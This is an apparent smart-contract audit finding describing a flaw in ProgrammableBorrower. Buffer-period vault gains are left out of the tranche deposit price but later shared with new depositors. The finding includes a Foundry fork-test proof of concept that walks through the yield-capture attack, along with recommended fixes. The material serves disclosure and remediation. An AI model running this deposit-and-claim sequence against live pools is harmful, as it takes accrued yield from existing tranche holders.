### Title
Buffer-period ERC4626 gains are excluded from tranche mint price but credited to new depositors - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` leaves vault shares invested while the credit pool is in the buffer phase. Vault gains earned during that phase are not immediately minted into `IdleCDOEpochVariant` tranche value, but are carried in `bufferedVaultDelta` and credited as pool interest at the next `stopEpoch`. A KYC-passing lender can therefore deposit during the buffer at a price that excludes already-earned vault appreciation, receive tranche shares, and later claim part of appreciation that was earned before their deposit.

### Finding Description
At epoch stop, `ProgrammableBorrower.onStopEpoch` clears the active accounting and stores the remaining external-vault value in `bufferStartVaultAssets` ([`ProgrammableBorrower.sol`](contracts/strategies/idle/ProgrammableBorrower.sol:256-265)). During the following buffer phase, the shares remain invested, but the CDO mint price does not include subsequent `convertToAssets` appreciation as already-realized tranche value.

When the next epoch starts, `onStartEpoch` computes:

```solidity
bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
```

before establishing the new epoch baseline ([`ProgrammableBorrower.sol`](contracts/strategies/idle/ProgrammableBorrower.sol:206-222)). At the next stop, `_vaultNetInterest` adds this carried delta to current vault delta, and `totalInterestDueNow` returns it as pool-facing interest ([`ProgrammableBorrower.sol`](contracts/strategies/idle/ProgrammableBorrower.sol:330-347)). `IdleCDOEpochVariant._stopEpoch` then mints strategy tokens for that gross interest and updates all tranche prices ([`IdleCDOEpochVariant.sol`](contracts/IdleCDOEpochVariant.sol:428-448)).

The invariant violated is fair minting: tranche shares minted during the buffer are priced without the pending external-vault gain, yet those shares participate in the later minted distribution of that same gain.

### Impact Explanation
An attacker can capture part of yield accrued entirely before their deposit. The extractable amount is bounded by the buffer-period ERC4626 gain and approximately equals:

```text
attackerShares / totalTrancheShares * bufferedVaultGain
```

after fees and tranche allocation. With a small existing pool or a large buffer-period gain, this can become a material theft of unclaimed yield from pre-existing AA/BB holders. The attacker does not need to control the vault, borrower, manager, owner, oracle, or strategy; they only need an allowed deposit during the buffer and a subsequent withdrawal claim.

### Likelihood Explanation
The vulnerable sequence only requires:

1. Programmable-borrower mode with minted interest.
2. A nonzero ERC4626 position left after `stopEpoch`.
3. Positive vault share-price appreciation during the buffer.
4. Deposit availability during the buffer.
5. A KYC-passing attacker wallet.

No privileged action, borrower misconduct, failed transfer, or external price oracle is required. The accounting design explicitly recognizes buffer-period vault PnL through `bufferedVaultDelta`, but the deposit-side share price does not exclude that pending gain from shares minted after the gain accrued.

### Recommendation
Prevent the mismatch between mint price and deferred yield. Appropriate fixes include:

- settle or mint realized buffer-period vault PnL before reopening deposits;
- disallow deposits until buffer-period PnL has been incorporated into tranche prices;
- account for `ProgrammableBorrower.bufferedVaultDelta`, `bufferInterest`, and live vault share value in the deposit/NAV calculation; or
- earmark realized buffer gains to the tranche holders who were present when the gains accrued.

Any fix should preserve the “one receipt, one payout” withdrawal accounting and handle both positive and negative `bufferedVaultDelta`.

### Proof of Concept
A Foundry fork test can be built on the existing `ProgrammableBorrowerCreditVault.t.sol` setup using a mainnet ERC4626 vault such as Steakhouse USDC.

```solidity
function test_bufferVaultGainDilution() external {
    uint256 depositAmount = 100_000 * oneScale;
    uint256 attackerDeposit = 10_000_000 * oneScale;

    // Existing lender enters and the first epoch starts.
    underlying.approve(address(cdoEpoch), type(uint256).max);
    idleCDO.depositAA(depositAmount);
    vm.prank(manager);
    cdoEpoch.startEpoch();

    // Stop in minted-interest mode. ProgrammableBorrower keeps ERC4626 shares
    // and snapshots bufferStartVaultAssets.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);
    uint256 baselineShares = morphoVault.balanceOf(address(programmableBorrower));
    uint256 baselineAssets = morphoVault.convertToAssets(baselineShares);

    // External-vault yield accrues while the CDO is in the buffer.
    // On a fork, move to a later block or cause genuine vault yield so that
    // convertToAssets increases.
    vm.rollFork(LATER_MAINNET_BLOCK);
    uint256 grownAssets = morphoVault.convertToAssets(baselineShares);
    uint256 unpricedGain = grownAssets - baselineAssets;
    assertGt(unpricedGain, 0);

    // Attacker is a KYC-passing lender and deposits at a tranche price that
    // excludes the pending buffer vault gain.
    address attacker = makeAddr("attacker");
    _allowWallet(attacker); // test helper / Keyring setup
    deal(USDC, attacker, attackerDeposit, true);

    vm.startPrank(attacker);
    underlying.approve(address(cdoEpoch), type(uint256).max);
    uint256 attackerSharesBefore = idleCDO.depositAA(attackerDeposit);
    vm.stopPrank();

    // Start the next epoch. onStartEpoch captures the old gain in
    // bufferedVaultDelta after the attacker already received shares.
    vm.prank(manager);
    cdoEpoch.startEpoch();
    int256 carriedDelta = programmableBorrower.bufferedVaultDelta();
    assertGt(carriedDelta, 0);

    // Finish the next epoch. The deferred gain is minted into tranche prices
    // and is shared by the attacker even though it accrued before deposit.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // Attacker requests and claims withdrawal under the vault's normal epoch
    // claim flow, then receives more underlying than their deposit plus the
    // yield attributable only to their active-epoch period.
    vm.prank(attacker);
    cdoEpoch.requestAAWithdraw(attackerSharesBefore);

    // Start/finish the following funding epoch and claim.
    vm.prank(manager);
    cdoEpoch.startEpoch();
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    vm.prank(attacker);
    strategy.claimWithdrawRequest();

    uint256 attackerBalance = underlying.balanceOf(attacker);
    assertGt(
        attackerBalance,
        attackerDeposit,
        "attacker captured pre-deposit buffer vault gain"
    );
}
```

The decisive assertion is that `bufferedVaultDelta > 0` is captured after the attacker’s shares are minted, then distributed through the next `stopEpoch` accounting update.
